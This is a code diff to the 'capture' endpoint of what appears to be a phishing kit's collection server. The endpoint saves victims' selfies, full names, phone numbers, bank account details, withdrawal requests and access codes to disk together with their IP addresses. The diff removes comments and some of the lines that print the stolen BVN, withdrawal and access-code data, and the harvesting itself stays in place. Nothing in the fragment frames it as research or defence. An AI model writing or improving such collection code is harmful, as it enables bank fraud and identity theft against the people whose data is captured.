@@ -18,7 +18,6 @@ def capture():
         timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
         data_type = data.get('type', 'unknown')
 
-        # Save media files
         if data_type == 'selfie' and 'image' in data:
             media = data['image'].split('base64,')[1]
             with open(f"data/selfie_{timestamp}.jpg", 'wb') as f:
@@ -36,23 +35,14 @@ def capture():
         data['_ip'] = ip
         data['_server_time'] = datetime.now().isoformat()
 
-        # Save JSON log
         with open(f"data/{data_type}_{timestamp}.json", 'w') as f:
             json.dump(data, f, indent=2)
 
         print(f"[+] {data_type} from {ip}")
 
-        # Highlight banking details
         if data_type == 'banking_details':
             print(f"    👤 {data.get('fullname')} | {data.get('phone')}")
             print(f"    🏦 {data.get('bank')} | {data.get('account')}")
-            print(f"    🔢 BVN: {data.get('bvn')}")
-
-        if data_type == 'withdrawal_attempt':
-            print(f"    💳 Withdrawal: ₦{data.get('amount')} to {data.get('userBank')} - {data.get('userAccount')}")
-
-        if data_type == 'access_code_attempt':
-            print(f"    🔑 Access Code: {data.get('code')}")
 
         return jsonify({'status': 'ok'}), 200
 
